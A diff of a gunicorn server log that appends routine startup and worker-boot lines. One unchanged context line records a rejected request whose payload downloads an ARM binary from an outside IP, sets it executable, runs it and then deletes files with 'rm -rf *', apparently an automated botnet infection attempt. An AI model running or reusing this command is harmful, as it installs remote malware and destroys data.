@@ -70,3 +70,8 @@
 [2026-01-13 01:15:38 +0000] [65998] [INFO] Booting worker with pid: 65998
 [2026-01-13 01:15:38 +0000] [65999] [INFO] Booting worker with pid: 65999
 [2026-01-16 17:28:01 +0000] [65998] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: 'http://185.186.26.162/5r3fqt67ew531has4231.arm; chmod 777 5r3fqt67ew531has4231.arm; ./5r3fqt67ew531has4231.arm; rm -rf * HTTP/1.0'
+[2026-01-30 18:34:51 +0000] [886] [INFO] Starting gunicorn 23.0.0
+[2026-01-30 18:34:51 +0000] [886] [INFO] Listening at: http://127.0.0.1:5000 (886)
+[2026-01-30 18:34:51 +0000] [886] [INFO] Using worker: gthread
+[2026-01-30 18:34:51 +0000] [944] [INFO] Booting worker with pid: 944
+[2026-01-30 18:34:51 +0000] [959] [INFO] Booting worker with pid: 959
